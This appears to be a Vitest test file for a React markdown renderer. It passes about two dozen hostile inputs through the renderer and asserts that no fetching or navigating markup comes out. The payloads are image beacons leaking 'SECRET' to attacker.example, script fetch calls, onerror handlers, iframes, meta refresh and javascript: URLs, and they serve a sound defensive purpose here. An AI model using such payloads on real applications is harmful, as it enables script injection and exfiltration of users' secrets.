import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { UntrustedText, UserText } from './UntrustedText';

/**
 * INV-9, verified by ACTUALLY RENDERING.
 *
 * server/inv9.test.ts greps the source for dangerouslySetInnerHTML and for
 * markdown libraries. That is a good regression guard, but it proves only that
 * nobody imported a renderer — it says nothing about whether the hand-written
 * one is safe, because it never runs it.
 *
 * That gap mattered: the red team console tells a judge the markdown beacon is
 * "verified by the INV-9 renderer test", and until this file existed, no test
 * had ever passed hostile text through the renderer and looked at the output.
 * The claim was ahead of the evidence.
 *
 * These tests render to static markup — no new dependency, react-dom is
 * already here — and assert on the HTML that a browser would actually receive.
 * The property is absolute: whatever the input, the output contains no element
 * or attribute capable of causing a network request or a navigation.
 */

const HOSTILE = [
  ['markdown image', '![x](https://attacker.example/x.png?d=SECRET)'],
  ['markdown image, no alt', '![](https://attacker.example/p.gif?d=SECRET)'],
  ['reference image', '![x][ref]\n\n[ref]: https://attacker.example/r.png'],
  ['markdown link', '[click me](https://attacker.example/phish)'],
  ['autolink', '<https://attacker.example/auto>'],
  ['bare url', 'Visit https://attacker.example/bare right now'],
  ['raw img tag', '<img src="https://attacker.example/raw.png?d=SECRET">'],
  ['raw script', '<script>fetch("https://attacker.example/x")</script>'],
  ['raw anchor', '<a href="https://attacker.example/a">go</a>'],
  ['svg onload', '<svg onload="fetch(1)"></svg>'],
  ['iframe', '<iframe src="https://attacker.example/f"></iframe>'],
  ['object data', '<object data="https://attacker.example/o"></object>'],
  ['css url', '<div style="background:url(https://attacker.example/c)">x</div>'],
  ['onerror img', '<img src=x onerror="fetch(\'https://attacker.example\')">'],
  ['js url in link', '[x](javascript:alert(1))'],
  ['data uri image', '![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)'],
  ['html entity img', '&lt;img src="https://attacker.example/e.png"&gt;'],
  ['nested in list', '- item ![x](https://attacker.example/l.png)'],
  ['nested in heading', '## ![x](https://attacker.example/h.png)'],
  ['nested in bold', '**![x](https://attacker.example/b.png)**'],
  ['nested in code', '`<img src="https://attacker.example/c.png">`'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://attacker.example">'],
  ['link rel', '<link rel="stylesheet" href="https://attacker.example/s.css">'],
  ['form action', '<form action="https://attacker.example/f"><input name="q"></form>'],
  ['base tag', '<base href="https://attacker.example/">'],
];

/**
 * Assertions must inspect the REAL tags the renderer emitted, not the text.
 *
 * The first version of this file regex-matched the whole HTML string for
 * ` src=` and ` on*=`, and reported ten failures. Every one was a false alarm:
 * React had escaped the payload to `&lt;img src=&quot;...&quot;&gt;`, which is
 * inert text that merely CONTAINS the characters "src=". Asserting on escaped
 * output is how a security test convinces you of a bug that is not there —
 * which is its own kind of dishonesty. So: parse out the actual tags, and
 * judge only those.
 */
const ALLOWED_TAGS = new Set([
  'div', 'p', 'h3', 'h4', 'ul', 'ol', 'li', 'span', 'strong', 'em', 'code',
]);

/** Real markup only: escaped payload text is `&lt;`, and never matches this. */
function emittedTags(html: string): string[] {
  return html.match(/<[^>]+>/g) ?? [];
}

function tagName(tag: string): string {
  return (tag.match(/^<\/?\s*([a-z0-9:-]+)/i)?.[1] ?? '').toLowerCase();
}

const RESOURCE_ATTR = /(src|href|srcset|action|formaction|data|poster|background|ping|xlink:href)\s*=/i;
const INLINE_HANDLER = /\son[a-z]+\s*=/i;

function auditRender(payload: string): { tags: string[]; offenders: string[] } {
  const html = renderToStaticMarkup(<UntrustedText text={payload} />);
  const tags = emittedTags(html);
  const offenders: string[] = [];
  for (const tag of tags) {
    if (!ALLOWED_TAGS.has(tagName(tag))) offenders.push(`disallowed element: ${tag}`);
    if (RESOURCE_ATTR.test(tag)) offenders.push(`resource attribute: ${tag}`);
    if (INLINE_HANDLER.test(tag)) offenders.push(`inline handler: ${tag}`);
  }
  return { tags, offenders };
}

describe('INV-9 — the renderer cannot be made to fetch or navigate', () => {
  for (const [name, payload] of HOSTILE) {
    it(`neutralises: ${name}`, () => {
      const { tags, offenders } = auditRender(payload);
      expect(offenders, offenders.join('\n')).toEqual([]);
      // Sanity: if the renderer emitted nothing at all, the assertion above is
      // vacuous. It must have produced real (safe) markup.
      expect(tags.length).toBeGreaterThan(0);
    });
  }

  it('applies the same rules to first-party text', () => {
    // A user who pastes a poisoned string into their own entry must not be
    // able to attack their own browser with it.
    const html = renderToStaticMarkup(
      <UserText text='<img src="https://attacker.example/u.png">' />,
    );
    for (const tag of emittedTags(html)) {
      expect(ALLOWED_TAGS.has(tagName(tag)), `unexpected element ${tag}`).toBe(true);
      expect(RESOURCE_ATTR.test(tag), `resource attribute in ${tag}`).toBe(false);
    }
  });

  it('escapes rather than drops, so the attack stays visible to the user', () => {
    // Silently deleting the payload would hide the attack. INV-9 renders it
    // inert AND legible — a judge must be able to see what was attempted.
    const html = renderToStaticMarkup(
      <UntrustedText text='<img src="https://attacker.example/x.png">' />,
    );
    expect(html).toContain('attacker.example');
    expect(html).toContain('&lt;img');
  });

  it('still formats the safe subset it is allowed to format', () => {
    // The renderer exists because users were seeing literal ### and **bold**.
    // If it stops formatting, the fix regressed even though INV-9 holds.
    const html = renderToStaticMarkup(
      <UntrustedText text={'## Title\n\n**bold** and `code`\n\n- one\n- two'} />,
    );
    expect(html).toContain('<h3');
    expect(html).toContain('<strong');
    expect(html).toContain('<code');
    expect(html).toContain('<ul');
  });

  it('handles adversarial input without throwing', () => {
    for (const junk of ['', '   ', '*'.repeat(5000), '#'.repeat(500), '`'.repeat(999), '\u0000\uFFFD']) {
      expect(() => renderToStaticMarkup(<UntrustedText text={junk} />)).not.toThrow();
    }
  });
});
